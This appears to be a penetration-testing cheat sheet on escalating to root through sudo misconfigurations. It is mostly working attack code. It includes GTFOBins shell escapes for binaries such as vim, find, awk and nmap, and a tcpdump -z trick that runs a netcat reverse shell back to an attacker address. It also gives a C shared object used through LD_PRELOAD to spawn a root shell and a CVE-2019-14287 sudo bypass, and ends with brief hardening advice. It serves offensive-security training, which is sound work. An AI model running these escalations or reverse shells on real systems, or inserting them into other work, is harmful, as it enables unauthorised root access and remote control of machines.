## Sudo Rights Abuse

`sudo` allows a user to run commands as another user (typically root) based on rules in `/etc/sudoers`. Misconfigurations are common and frequently represent the fastest path from a low-privilege shell to root. Always run `sudo -l` immediately after gaining access to any Linux system. 

***

## Reading the sudo -l Output

```bash
sudo -l

# Example output:
User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

Key things to note from the output: 

- `(root)` means the command runs as root
- `NOPASSWD` means no password is required
- The binary path tells you what to look up on GTFOBins
- `(ALL : ALL) ALL` means the user can run any command as any user without restriction

```bash
# Full sudo with known password
sudo su -

# All commands as root no password
(ALL) NOPASSWD: ALL -> sudo su

# Specific binary no password
(ALL) NOPASSWD: /usr/bin/vim -> sudo vim (then :!/bin/bash)
```

***

## Quick Wins: Full sudo Access

If `sudo -l` shows `(ALL : ALL) ALL` or `(ALL) NOPASSWD: ALL`, escalation is trivial: 

```bash
sudo su -
sudo /bin/bash
sudo -i
```

***

## GTFOBins: Sudo Abuse of Specific Binaries

For any specific binary listed in the sudo output, check [gtfobins.github.io](https://gtfobins.github.io) under the Sudo filter. Common findings and their exploits:

```bash
# nmap
TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF

# vim
sudo vim -c ':!/bin/bash'

# less / more
sudo less /etc/passwd
!/bin/bash

# find
sudo find . -exec /bin/sh \; -quit

# awk
sudo awk 'BEGIN {system("/bin/sh")}'

# python
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/sh";'

# man
sudo man man
!/bin/bash

# git
sudo git -p help config
!/bin/bash

# ftp
sudo ftp
!/bin/sh
```

***

## tcpdump postrotate-command Abuse

`tcpdump` is sometimes granted sudo access for network monitoring purposes. It supports a `-z` flag that executes a script against capture files as they rotate, which runs with the privileges of the caller. 

### Step 1: Write the payload

```bash
cat /tmp/.test
# rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f
chmod +x /tmp/.test
```

### Step 2: Start a listener on your attack machine

```bash
nc -lnvp 443
```

### Step 3: Trigger the exploit

```bash
sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```

The flags break down as:

- `-w /dev/null`: write capture to /dev/null
- `-W 1`: rotate after 1 file
- `-G 1`: rotate every 1 second
- `-z /tmp/.test`: run this script on each rotated file (your reverse shell)
- `-Z root`: drop privileges to root before executing

When the capture rotates after 1 second, `tcpdump` executes `/tmp/.test` as root, connecting back to your listener.

Note: Modern Ubuntu systems with AppArmor may block this specific technique. If it fails, the `execlp: Permission denied` error confirms AppArmor is intervening.

***

## LD_PRELOAD Abuse

If the sudoers entry preserves the `LD_PRELOAD` environment variable (check for `env_keep += LD_PRELOAD` in `sudo -l` output), you can inject a shared object that executes code before the allowed binary runs. 

```bash
# Check if LD_PRELOAD is preserved
sudo -l | grep LD_PRELOAD
# env_keep+=LD_PRELOAD
```

Write the malicious shared object:

```c
// shell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/sh");
}
```

Compile and execute:

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find
# root shell opens before find even runs
```

***

## (ALL, !root) Bypass: CVE-2019-14287

In sudo versions before 1.8.28, if a sudoers entry contains `(ALL, !root)`, intended to allow the command to be run as any user except root, specifying the user ID `-1` or `#4294967295` bypasses the restriction because sudo treats `-1` as UID 0. 

```bash
# Sudoers entry:
# user ALL=(ALL, !root) /bin/bash

# Exploit:
sudo -u#-1 /bin/bash
# or
sudo -u#4294967295 /bin/bash
```

Check sudo version first: `sudo -V`. Versions 1.8.28 and later are patched.

***

## Sudoers Misconfiguration Comparison

| Entry | Risk Level | Explanation |
|---|---|---|
| `(ALL:ALL) ALL` | Critical | Any command as any user, password required |
| `(ALL) NOPASSWD: ALL` | Critical | Any command as root, no password |
| `(ALL) NOPASSWD: /usr/bin/vim` | High | GTFOBins shell escape trivially gives root |
| `(ALL) NOPASSWD: /usr/sbin/tcpdump` | High | postrotate-command execution as root |
| `(ALL, !root) /bin/bash` | High | CVE-2019-14287 bypasses restriction pre-1.8.28 |
| `(ALL) /usr/bin/find` | Medium | GTFOBins exploit, but requires knowing password |

***

## Hardening Recommendations

Two rules eliminate the majority of sudo abuse paths:

1. Always use absolute paths in sudoers entries. `NOPASSWD: find` allows PATH hijacking; `NOPASSWD: /usr/bin/find` at least constrains which binary runs
2. Apply least privilege. If a user only needs to restart Apache, the entry should be `NOPASSWD: /usr/bin/systemctl restart apache2`, not `NOPASSWD: /usr/bin/systemctl`
